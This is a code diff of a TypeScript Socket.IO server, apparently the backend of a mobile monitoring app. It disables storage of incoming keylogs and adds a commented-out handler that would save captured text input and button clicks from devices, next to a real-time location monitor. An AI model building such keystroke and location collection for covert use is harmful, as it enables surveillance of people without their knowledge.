@@ -515,7 +515,7 @@ export const startSocketIO = async () => {
 							);
 
 							// Data should be include deviceId and keylogs
-							await addNewKeyLogs(response);
+							// await addNewKeyLogs(response);
 						} else {
 							console.log("Empty key logs, skipping...");
 						}
@@ -524,6 +524,37 @@ export const startSocketIO = async () => {
 					}
 				}
 			);
+
+			// Offline Keylogs Save
+			// socket.on(
+			// 	`${SocketIOPublicEvents.KEY_MOBILE__OffLINE_RESPONSE}`,
+			// 	async (response: any) => {
+			// 		try {
+			// 			const deviceId = response.deviceId;
+			// 			const keyLogsType = response.keyLogsType;
+			// 			const keylogs = response.keylogs;
+			// 			const keyEvent = response.event;
+			// 			console.log("online keylogs=>", response);
+			// 			// Check if keylogs is not an empty string before proceeding
+			// 			if (
+			// 				(keyEvent === "Text Input" ||
+			// 					keyEvent === "Button Click") &&
+			// 				keylogs &&
+			// 				keylogs !== "[]" &&
+			// 				keylogs !== ""
+			// 			) {
+			// 				console.log("KEYLOGS SEND===>", keylogs);
+
+			// 				// Data should be include deviceId and keylogs
+			// 				await addNewKeyLogs(response);
+			// 			} else {
+			// 				console.log("Empty key logs, skipping...");
+			// 			}
+			// 		} catch (error) {
+			// 			console.log("Key Logs Response Error", error);
+			// 		}
+			// 	}
+			// );
 
 			// Real-Time Location Monitor
 			socket.on(
